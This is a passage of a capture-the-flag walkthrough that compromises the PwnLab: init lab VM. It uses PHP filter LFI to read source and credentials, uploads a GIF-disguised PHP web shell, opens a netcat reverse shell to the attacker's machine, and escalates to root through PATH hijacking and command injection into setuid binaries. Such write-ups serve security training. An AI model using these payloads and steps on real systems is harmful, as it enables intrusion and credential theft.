KRaCiSoBOJRKKhSIJOJBKJhiIJOpFIJBqKJOhEIpFoKJKgE4lEoqFIgk4kEomGIgk6kUgkGook6EQikWgokqATiUSioUiCTiQSiYYiCTqRSCQaiiToRCKRaCiSoBOJRKKhSIJOJBKJhiIJOpFIJBqKJOhEIpFoKJKgE4lEopGoqv8HW9veO6bIcr4AAAAASUVORK5CYII=) **

Let's see if we can bypass the authentication form, using** m**anual SQLi
attacks as well as sqlmap seemed fruitless.

  

    
    
    1  
    2  
    3  
    4  
    5

|

    
    
    root@kali:~/Desktop# sqlmap -u "http://192.168.1.65/?page=login" --data="user=abcd&pass=abcd&submit=Login" --level=5 --risk=3 --dbms=mysql  
    ...  
    [23:20:31] [CRITICAL] all tested parameters appear to be not injectable. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp'). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment')  
      
    [*] shutting down at 23:20:31  
      
  
---|---  
  
Damn, we need to find other ways, how about the page parameter in the url? It
could be vulnerable to LFI.  
  
**3.2 LFI vulnerability **   
Example vulnerable code:  
  

    
    
    1  
    2  
    3  
    4  
    5  
    6

|

    
    
    <?php  
       if (isset($_GET['page']))  
       {  
          include($_GET['page'] . '.php');  
       }  
    ?>  
      
  
---|---  
  
  
None of these worked:** **  

  * http://192.168.1.65/?page=/etc/passwd
  * http://192.168.1.65/?page=/etc/passwd
  * http://192.168.1.65/?page=../../../../../../../etc/passwd
  * http://192.168.1.65/?page=../../../../../../../etc/passwd

Yet, the following worked!  
  

    
    
    1

|

    
    
    http://192.168.1.65/?page=php://filter/convert.base64-encode/resource=index  
      
  
---|---  
  
  
Using PHP filters to encode the .php file content to base64 string allows us
to bypass it being executed by the server.  
  
**Config: **  
  

    
    
    1  
    2  
    3  
    4  
    5  
    6

|

    
    
    <?php  
    $server      = "localhost";  
    $username = "root";  
    $password = "H4u%QJ_H99";  
    $database = "Users";  
    ?>  
      
  
---|---  
  
  
Sweet! We got the MySQL credentials. Before we dump the database let's
continue checking out the remaining pages.  
  
**Index: **  
  

    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
     8  
     9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
    29  
    30  
    31

|

    
    
    <?php  
    //Multilingual. Not implemented yet.  
    //setcookie("lang","en.lang.php");  
    if (isset($_COOKIE['lang']))  
    {  
        include("lang/".$_COOKIE['lang']);  
    }  
    // Not implemented yet.  
    ?>  
    <html>  
    <head>  
    <title>PwnLab Intranet Image Hosting</title>  
    </head>  
    <body>  
    <center>  
    <img src="images/pwnlab.png"><br />  
    [ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]  
    <hr/><br/>  
    <?php  
        if (isset($_GET['page']))  
        {  
            include($_GET['page'].".php");  
        }  
        else  
        {  
            echo "Use this server to upload and share image files inside the intranet";  
        }  
    ?>  
    </center>  
    </body>  
    </html>  
      
  
---|---  
  
  * **Lines 4-6:** LFI vulnerability, if we set a cookie with name _lang _pointing to a file in the file system, it will be included. We don't even need to worry about it not ending in .php!
  * **Lines 20-23:** LFI vulnerability we already got the source code thanks to.

  
**Upload: **  
  

    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
     8  
     9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
    29  
    30  
    31  
    32  
    33  
    34  
    35  
    36  
    37  
    38  
    39  
    40  
    41  
    42  
    43  
    44  
    45  
    46  
    47  
    48  
    49  
    50  
    51

|

    
    
    <?php  
     session_start();  
     if (!isset($_SESSION['user'])) { die('You must be log in.'); }  
    ?>  
      
    <html>  
        <body>  
            <form action='' method='post' enctype='multipart/form-data'>  
                <input type='file' name='file' id='file' />  
                <input type='submit' name='submit' value='Upload'/>  
            </form>  
        </body>  
    </html>  
      
    <?php  
    if(isset($_POST['submit'])) {  
        if ($_FILES['file']['error'] <= 0) {  
            $filename  = $_FILES['file']['name'];  
            $filetype  = $_FILES['file']['type'];  
            $uploaddir = 'upload/';  
            $file_ext  = strrchr($filename, '.');  
            $imageinfo = getimagesize($_FILES['file']['tmp_name']);  
            $whitelist = array(".jpg",".jpeg",".gif",".png");  
      
            if (!(in_array($file_ext, $whitelist))) {  
                die('Not allowed extension, please upload images only.');  
            }  
      
            if(strpos($filetype,'image') === false) {  
                die('Error 001');  
            }  
      
            if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {  
                die('Error 002');  
            }  
      
            if(substr_count($filetype, '/')>1){  
                die('Error 003');  
            }  
      
            $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;  
      
            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {  
                echo "<img src=\"".$uploadfile."\"><br />";  
            } else {  
                die('Error 4');  
            }  
        }  
    }  
      
    ?>  
      
  
---|---  
  
  
We haven't figured yet a way to access this page, but this page is full of
juicy content we just can't skip!  

  * **Lines 2-3:** That's what has been denying us access.
  * **Lines 16-49:** Many conditions for uploading a file:
    * Err 0: Whitelist for files ending with .jpg, ,jpeg, .gif and .png
    * Err 1: File is not identified as an image
    * Err 2: HEX signature validation?
    * Err 3: File name contains '/' to avoid LFI
    * Err 4: Failed to upload file

## 4\. Accessing MySQL

Alright, now that we know how to upload a backdoor, we need to be able to
access this page. Let's try to access mysql remotely using the credentials we
found in config.php.  
  

    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
     8  
     9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
    29  
    30  
    31  
    32  
    33  
    34  
    35  
    36  
    37  
    38

|

    
    
    root@kali:~/Desktop# mysql -h 192.168.1.65 -u root -p  
    Enter password:  
    Welcome to the MySQL monitor.  Commands end with ; or \g.  
    Your MySQL connection id is 44533  
    Server version: 5.5.47-0+deb8u1 (Debian)  
      
    Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.  
    Oracle is a registered trademark of Oracle Corporation and/or its  
    affiliates. Other names may be trademarks of their respective  
    owners.  
      
    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.  
      
    **mysql> use Users;**  
    Reading table information for completion of table and column names  
    You can turn off this feature to get a quicker startup with -A  
      
    Database changed  
    **mysql> show tables;**  
    +-----------------+  
    | Tables_in_Users |  
    +-----------------+  
    | users           |  
    +-----------------+  
      
    1 row in set (0.00 sec)  
      
    **mysql> select * from users;**  
    +------+------------------+  
    | user | pass             |  
    +------+------------------+  
    | kent | Sld6WHVCSkpOeQ== |  
    | mike | U0lmZHNURW42SQ== |  
    | kane | aVN2NVltMkdSbw== |  
    +------+------------------+  
    3 rows in set (0.00 sec)  
      
    mysql>   
      
  
---|---  
  
  
Passwords look to be in base64 format:  

  * kent: JWzXuBJJNy
  * mike: SIfdsTEn6I
  * kane: iSv5Ym2GRo

## 5\. Uploading a backdoor

Using any of the credentials provided allows us to access the upload page.
What we want to do now is find a way to get a shell.  
**How about uploading a GIF containing PHP code, and include it by the LFI vulnerability we found earlier (lang cookie)?**  
  
1\. Create fake PNG file containing PHP code.  

    
    
    GIF89;  
    <?php system($_GET["cmd"]) ?>  
    

  * _GIF89; _is to bypass the type check, more info [here.](https://en.wikipedia.org/wiki/List_of_file_signatures)
  * File is stored by its md5 hash, so it's stored at **../upload/32d3ca5e23f4ccf1e4c8660c40e75f33.png**

2\. Set lang cookie to include the image we uploaded:  

    
    
    document.cookie="lang=../upload/32d3ca5e23f4ccf1e4c8660c40e75f33.png"  
    

  
3\. Start a netcat listener on Kali  

    
    
    root@kali:~/Desktop# nc -nvlp 4444  
    listening on [any] 4444 ...  
    

  
4\. Connect to the open port  

    
    
    http://192.168.1.65/?cmd=nc -nv 192.168.1.71 4444 -e /bin/bash  
    

  
5\. Did we get our shell?  

    
    
    root@kali:~/Desktop# nc -nvlp 4444  
    listening on [any] 4444 ...  
    connect to [192.168.1.71] from (UNKNOWN) [192.168.1.65] 57556  
    whoami  
    whoami  
    www-data  
    python -c 'import pty; pty.spawn("/bin/bash");'  
    www-data@pwnlab:/var/www/html$  
    

## 6\. Privilege Escalation

_I won't be discussing which attempts I made since they're countless, check
[this ](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-
escalation/)article for useful info._  
  

#### 1\. Running as kent

  

    
    
     1  
     2  
     3  
     4  
     5  
     6  
     7  
     8  
     9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
    29  
    30  
    31  
    32  
    33

|

    
    
    www-data@pwnlab:/home$ ls -al  
    ls -al  
    total 24  
    drwxr-xr-x  6 root root 4096 Mar 17  2016 .  
    drwxr-xr-x 21 root root 4096 Mar 17  2016 ..  
    drwxr-x---  2 john john 4096 Mar 17  2016 john  
    drwxr-x---  2 kane kane 4096 Mar 17  2016 kane  
    drwxr-x---  2 kent kent 4096 Mar 17  2016 kent  
    drwxr-x---  2 mike mike 4096 Mar 17  2016 mike  
    www-data@pwnlab:/home$ su kent  
    su kent  
    Password: JWzXuBJJNy  
      
    kent@pwnlab:/home$ cd kent  
    cd kent  
    kent@pwnlab:~$ ls -al  
    ls -al  
    total 20  
    drwxr-x--- 2 kent kent 4096 Mar 17  2016 .  
    drwxr-xr-x 6 root root 4096 Mar 17  2016 ..  
    -rw-r--r-- 1 kent kent  220 Mar 17  2016 .bash_logout  
    -rw-r--r-- 1 kent kent 3515 Mar 17  2016 .bashrc  
    -rw-r--r-- 1 kent kent  675 Mar 17  2016 .profile  
    kent@pwnlab:~$ find / -user kent 2>/dev/null  
    find / -user kent 2>/dev/null  
    <-- retracted -->  
    /home/kent  
    /home/kent/.bashrc  
    /home/kent/.profile  
    /home/kent/.bash_logout  
    kent@pwnlab:~$ sudo -l  
    sudo -l  
    bash: sudo: command not found  
      
  
---|---  
  
  
Eh, nothing useful. Kent [you suck](https://memecrunch.com/meme/6Q91R/you-
suck/image.gif?w=499&c=1)!  
  

#### 2\. Running as mike (part 1)

You'll notice that the password for mike pulled from Mysql doesn't work. We'll
get back to mike later.  
  

#### 3.Running as kane

  

    
    
    kane@pwnlab:~$ ls -al  
    ls -al  
    total 28  
    drwxr-x--- 2 kane kane 4096 Mar 17  2016 .  
    drwxr-xr-x 6 root root 4096 Mar 17  2016 ..  
    -rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout  
    -rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc  
    **-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike**  
    -rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile  
    kane@pwnlab:~$ file msgmike  
    file msgmike  
    msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped  
    kane@pwnlab:~$ ./msgmike  
    ./msgmike  
    **cat: /home/mike/msg.txt: No such file or directory**  
    kane@pwnlab:~$ strings msgmike  
    ...  
    **cat /home/mike/msg.txt**  
    ...  
    kane@pwnlab:~$   
    

  
Are you thinking what I'm thinking? *wink wink*  
**msgmike** might be doing the following code:  
  

    
    
    int main()  
    {  
          system("cat /home/mike/msg.txt");  
    }  
    

  
This is very poorly configured as **cat **command is found by searching for
files with that specific name in the PATH environment variable. If we create a
script called **cat** in a certain directory and override the PATH variable,
we might be able to get a shell for use mike!  
_(If you're interested in such problems, check out root-me.org's system
problems!)_  
  

    
    
    kane@pwnlab:~$ echo "/bin/bash" > cat  
    echo "/bin/bash #" > cat  
    kane@pwnlab:~$ chmod 777 cat  
    chmod 777 cat  
    kane@pwnlab:~$ export PATH=/home/kane  
    export PATH=/home/kane  
    kane@pwnlab:~$ ./msgmike  
    ./msgmike  
    bash: dircolors: command not found  
    bash: ls: command not found  
    mike@pwnlab:~$   
    

####

####  

#### 4\. Running as mike and becoming ~~god~~ root

You'll need to reset the PATH variable first.  
  

    
    
    mike@pwnlab:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
    mike@pwnlab:~$ cd ../mike  
    cd ../mike  
    mike@pwnlab:/home/mike$ ls -al  
    ls -al  
    total 28  
    drwxr-x--- 2 mike mike 4096 Mar 17  2016 .  
    drwxr-xr-x 6 root root 4096 Mar 17  2016 ..  
    -rw-r--r-- 1 mike mike  220 Mar 17  2016 .bash_logout  
    -rw-r--r-- 1 mike mike 3515 Mar 17  2016 .bashrc  
    -rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root  
    -rw-r--r-- 1 mike mike  675 Mar 17  2016 .profile  
    mike@pwnlab:/home/mike$ ./msg2root  
    ./msg2root  
    Message for root: wanna hook?  
    wanna hook?  
    wanna hook?  
    mike@pwnlab:/home/mike$ strings msg2root  
    strings msg2root  
    ...  
    Message for root:   
    /bin/echo %s >> /root/messages.txt  
    ...  
    mike@pwnlab:/home/mike$   
    

  
Hmm... msg2root possibly looks like this (might not compile, don't complain!):  
  

    
    
    #include <iostream>  
      
    char msg[1024];  //Let's assume no BO takes place, alrighty?  
    char command[1024];   
      
    int main()  
    {  
     printf("Message for root: ");  
     scanf("%s", msg);  
     snprintf(command, sizeof(command), "/bin/echo %s >> /root/messages.txt", msg);  
     system(command);  
    }  
    

  
Let's find a way in.  
  

    
    
    mike@pwnlab:/home/mike$ ./msg2root  
    ./msg2root  
    Message for root: **opensesame; bash -p** **//-p to preserve current privileges**  
    opensesame; bash -p  
    opensesame  
    bash-4.3# whoami  
    whoami  
    root  
    bash-4.3# cd /root  
    cd /root  
    bash-4.3# ls -al  
    ls -al  
    total 20  
    drwx------  2 root root 4096 Mar 17  2016 .  
    drwxr-xr-x 21 root root 4096 Mar 17  2016 ..  
    lrwxrwxrwx  1 root root    9 Mar 17  2016 .bash_history -> /dev/null  
    -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc  
    ----------  1 root root 1840 Mar 17  2016 flag.txt  
    lrwxrwxrwx  1 root root    9 Mar 17  2016 messages.txt -> /dev/null  
    lrwxrwxrwx  1 root root    9 Mar 17  2016 .mysql_history -> /dev/null  
    -rw-r--r--  1 root root  140 Nov 19  2007 .profile  
    bash-4.3# cat flag.txt   
    cat flag.txt  
    .-=~=-.                                                                 .-=~=-.  
    (__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)  
    (_ ___)  _____                             _                            (_ ___)  
    (__  _) /  __ \                           | |                           (__  _)  
    ( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)  
    (__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)  
    (_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)  
    (__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)  
    ( _ __)                     __/ |                                       ( _ __)  
    (__  _)                    |___/                                        (__  _)  
    (__  _)                                                                 (__  _)  
    (_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)  
    ( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)  
    (__  _) this challenge.                                                 (__  _)  
    (_ ___)                                                                 (_ ___)  
    ( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)  
    (__  _) reading it                                                      (__  _)  
    (__  _)                                                                 (__  _)  
    (__  _)                                             For sniferl4bs.com  (__  _)  
    ( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)  
    (__  _)                                                                 (__  _)  
    (_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)  
    `-._.-'                                                                 `-._.-'  
    bash-4.3#   
    

  
That was fun! Thanks for reading!  
  
_Currently listening to: [Altar of Plagues - Burnt
Year](https://www.youtube.com/watch?v=ok454hznwoc)_

